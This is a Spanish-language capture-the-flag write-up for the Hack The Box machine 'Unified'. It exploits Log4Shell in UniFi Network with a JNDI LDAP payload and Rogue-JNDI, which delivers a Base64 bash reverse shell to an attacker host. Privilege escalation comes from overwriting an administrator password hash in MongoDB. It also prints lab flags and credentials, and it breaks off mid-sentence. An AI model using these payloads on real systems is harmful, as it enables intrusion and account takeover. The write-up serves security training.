
# HTB - Unified

## Machine Information

| Information          | Value                                   |
| -------------------- | --------------------------------------- |
| Machine              | Unified                                 |
| IP                   | 10.129.96.149                           |
| OS                   | Linux (Ubuntu)                          |
| Difficulty           | Easy                                    |
| Initial Access       | CVE-2021-44228 (Log4Shell)              |
| Privilege Escalation | MongoDB / UniFi Credential Manipulation |
| Final Access         | SSH as root                             |

# 1. Reconocimiento

Comenzamos realizando un escaneo de puertos para identificar los servicios expuestos por la máquina.

El escaneo revela los siguientes servicios:

```text
22/tcp    SSH
6789/tcp  ibm-db2-admin
8080/tcp  HTTP
8443/tcp  HTTPS
8843/tcp  HTTPS
8880/tcp  HTTP
```

El puerto `22` corresponde a SSH:

```text
OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
```

El puerto `8080` expone un servidor Apache Tomcat y redirige hacia:

```text
https://10.129.96.149:8443/manage
```

El puerto `8443` es especialmente interesante porque encontramos una instancia de **UniFi Network**.

El certificado HTTPS contiene información relacionada con:

```text
commonName=UniFi
Ubiquiti Inc.
```

Por lo tanto, nuestro principal objetivo pasa a ser la aplicación UniFi.

# 2. Enumeración Web

Accedemos a:

```text
https://10.129.96.149:8443/manage
```

Encontramos el panel de login de UniFi Network.

Al identificar la versión utilizada por el servicio, investigamos vulnerabilidades conocidas asociadas con dicha versión.

Una de las vulnerabilidades relevantes es:

```text
CVE-2021-44228
```

conocida como **Log4Shell**.

# 3. Acceso Inicial: CVE-2021-44228 Log4Shell

Log4Shell es una vulnerabilidad crítica asociada con Apache Log4j.

El problema ocurre cuando una aplicación registra datos controlados por el atacante y Log4j procesa expresiones JNDI especialmente construidas.

Esto puede provocar que el servidor realice una conexión hacia infraestructura controlada por el atacante y, en configuraciones vulnerables, llegar hasta la ejecución remota de código.

Entre los protocolos que pueden intervenir en este mecanismo se encuentran LDAP, RMI, DNS e IIOP.

En esta máquina utilizaremos LDAP para comprobar la vulnerabilidad y posteriormente conseguir ejecución de comandos.

# 4. Confirmación de Log4Shell

Primero abrimos Burp Suite y configuramos el navegador para utilizarlo como proxy.

Después accedemos al login de UniFi:

```text
https://10.129.96.149:8443/manage/.../login
```

Intentamos iniciar sesión con cualquier combinación de usuario y contraseña.

La petición `POST` puede ser interceptada desde Burp Suite y enviada a Repeater mediante:

```text
Ctrl + R
```

Uno de los parámetros interesantes de la petición es:

```text
remember
```

Antes de intentar ejecutar código, podemos comprobar si el servidor procesa nuestra expresión JNDI.

Para observar las conexiones LDAP entrantes utilizamos:

```bash
sudo tcpdump -i tun0 port 389
```

En Burp Suite Repeater modificamos el parámetro:

```json
"remember":"${jndi:ldap://10.10.14.141/attacker.com}",
```

Al enviar la petición, observamos tráfico LDAP desde la máquina víctima:

```text
10.129.96.149.32838 > Nitblan.ldap: Flags [S] ...
```

Esto confirma que el servidor está realizando una conexión LDAP hacia nuestra máquina.

Por lo tanto, podemos confirmar que el objetivo es vulnerable a Log4Shell.

# 5. Preparación de Rogue-JNDI

Para convertir la conexión JNDI en una ejecución de comandos utilizamos **Rogue-JNDI**.

Primero instalamos Java 11 y Maven.

En Arch Linux:

```bash
sudo pacman -S jdk11-openjdk
sudo pacman -S maven
```

En Debian/Ubuntu:

```bash
sudo apt install openjdk-11-jdk -y
sudo apt-get install maven -y
```

Clonamos el repositorio:

[Rogue-JNDI](https://github.com/veracode-research/rogue-jndi?utm_source=chatgpt.com)

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

Una vez compilado, podemos utilizar Rogue-JNDI para entregar el payload mediante LDAP.

# 6. Preparación del Reverse Shell

Utilizamos una reverse shell de Bash codificada en Base64.

El comando utilizado es:

```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.14.141/4444 0>&1' | base64
```

El resultado obtenido es:

```text
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQxOjQ0NDQgMD4mMQo=
```

La codificación Base64 permite transportar el comando evitando problemas con determinados caracteres especiales.

Si las comillas simples producen problemas en el entorno utilizado, pueden sustituirse por comillas dobles.

Después levantamos Rogue-JNDI:

```bash
java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQxOjQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" \
  --hostname "10.10.14.141"
```

El servidor queda preparado para recibir la petición JNDI y entregar nuestro comando.

# 7. Obtención de la Reverse Shell

Antes de enviar el payload desde Burp Suite iniciamos nuestro listener:

```bash
nc -lvnp 4444
```

Volvemos a Burp Suite Repeater y modificamos el parámetro `remember`:

```json
"remember":"${jndi:ldap://10.10.14.141:1389/o=tomcat}",
```

Al enviar la petición, UniFi procesa la expresión JNDI.

El flujo es:

```text
UniFi
    |
Log4j
    |
JNDI
    |
LDAP
    |
Rogue-JNDI
    |
Base64 Payload
    |
Bash
    |
Reverse Shell
```

Finalmente recibimos una shell en nuestra máquina atacante como:

```text
unifi
```

# 8. Upgrade de Shell

La shell inicial no es completamente interactiva, por lo que podemos mejorarla utilizando:

```bash
script /dev/null -c bash
```

Esto nos proporciona una terminal más funcional para continuar con la enumeración.

# 9. User Flag

Con acceso al sistema podemos acceder al directorio de `michael`:

```bash
cd /home/michael
```

La flag se encuentra en:

```bash
cat user.txt
```

Resultado:

```text
6ced1a6a89e666c0620cdb10262ba127
```

La `user flag` es:

```text
6ced1a6a89e666c0620cdb10262ba127
```

# 10. Enumeración para Privilege Escalation

Ahora necesitamos encontrar una forma de pasar del usuario `unifi` a `root`.

Durante la enumeración local encontramos que MongoDB está ejecutándose en la máquina.

Podemos comprobar los procesos relacionados con MongoDB:

```bash
ps aux | grep mongo
```

Encontramos `mongod` escuchando en el puerto:

```text
27117
```

Este puerto es especialmente interesante porque corresponde a la base de datos utilizada por UniFi.

# 11. Enumeración de MongoDB

Podemos conectarnos directamente a MongoDB utilizando:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

La consulta devuelve información de los usuarios administrativos de UniFi.

Entre la información obtenida encontramos hashes SHA-512 asociados con diferentes usuarios, incluyendo:

```text
administrator
```

En lugar de intentar crackear el hash existente, podemos reemplazarlo por un hash que conozcamos.

# 12. Modificación del Hash de Administrator

Generamos un nuevo hash SHA-512 utilizando `mkpasswd`:

```bash
mkpasswd -m sha-512 Password1234
```

Obtenemos un hash similar a:

```text
$6$Ihhippe3E6d8j.L9$W8J8SkfeEzKdQXCeB1VZ3D59vQ1YdQP2gsS0qX...
```

Después modificamos el registro del usuario `administrator` en MongoDB.

Utilizamos:

```bash
mongo --port 27117 ace --eval \
  'db.admin.update(
    {"_id": ObjectId("61ce278f46e0fb0012d47ee4")},
    {$set:{"x_shadow":"$6$Ihhippe3E6d8j.L9$W8J8SkfeEzKdQXCeB1VZ3D59vQ1YdQP2gsS0qX.YI4txlQMixZa2yUW7FdduhHTVoYyJRajJ.Gw9AJ3KIJC5S/"}}
  )'
```

MongoDB confirma la modificación:

```text
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

Esto indica que el registro del usuario fue encontrado y que el hash fue modificado.

# 13. Acceso como Administrator

Ahora podemos iniciar sesión en el panel de UniFi utilizando:

```text
Username: administrator
Password: Password1234
```

Una vez dentro del panel, exploramos la configuración del sitio.

Durante la enumeración encontramos información sensible que contiene las credenciales de `root`:

```text
root / NotACrackablePassword4U2022
```

Ya que SSH está habilitado, podemos utilizar estas credenciales para conectarnos directamente como `root`.

```bash
ssh root@10.129.96.149
```

Obtenemos una sesión SSH con privilegios de root.

# 14. Root Flag

Una vez conectados como `root`, accedemos al directorio:

```bash
cd /root
```

y leemos:

```bash
cat /root/root.txt
```

Resultado:

```text
e50bc93c75b634e4b272d2f771c33681
```

La `root flag` es:

```text
e50bc93c75b634e4b272d2f771c33681
```

# 15. Flags

```text
User flag:
6ced1a6a89e666c0620cdb10262ba127

Root flag:
e50bc93c75b634e4b272d2f771c33681
```

# 16. Attack Path

```text
Port Enumeration
    |
UniFi Network on 8443
    |
Version Enumeration
    |
CVE-2021-44228
    |
Log4Shell
    |
JNDI LDAP Connection
    |
Rogue-JNDI
    |
Base64 Reverse Shell
    |
Shell as unifi
    |
MongoDB on 27117
    |
UniFi Database
    |
Administrator Hash
    |
Modify Hash
    |
administrator / Password1234
    |
UniFi Configuration
    |
Root Credentials
    |
SSH
    |
root
    |
Root Flag
```

# 17. Vulnerabilities & Techniques

* Service Enumeration
* Web Application Enumeration
* UniFi Network Enumeration
* CVE-2021-44228
* Log4Shell
* JNDI Injection
* LDAP
* Remote Code Execution
* Rogue-JNDI
* Bash Reverse Shell
* Base64 Encoding
* Shell Upgrade
* Local MongoDB Enumeration
* Sensitive Information Disclosure
* UniFi Database Enumeration
* Password Hash Manipulation
* Credential Modification
* Credential Reuse
* SSH Authentication
* Privilege Escalation to root

# 18. Lessons Learned

Unified es una máquina especialmente buena para entender cómo una vulnerabilidad conocida puede convertirse en una cadena completa de explotación.

El primer punto importante es que no debemos asumir que encontrar una versión vulnerable significa que ya tenemos ejecución remota. Primero debemos confirmar el comportamiento.

En este caso utilizamos:

```bash
sudo tcpdump -i tun0 port 389
```

y un payload JNDI para comprobar que el servidor realmente intentaba conectarse a nuestra infraestructura.

Después utilizamos Rogue-JNDI para convertir esa conexión LDAP en una cadena que termina ejecutando nuestro comando.

El segundo punto importante es la enumeración posterior a la explotación.

Después de conseguir acceso como `unifi`, no terminamos la máquina. Encontramos MongoDB ejecutándose localmente:

```text
27117
```

y descubrimos que contenía información utilizada por UniFi.

En lugar de in
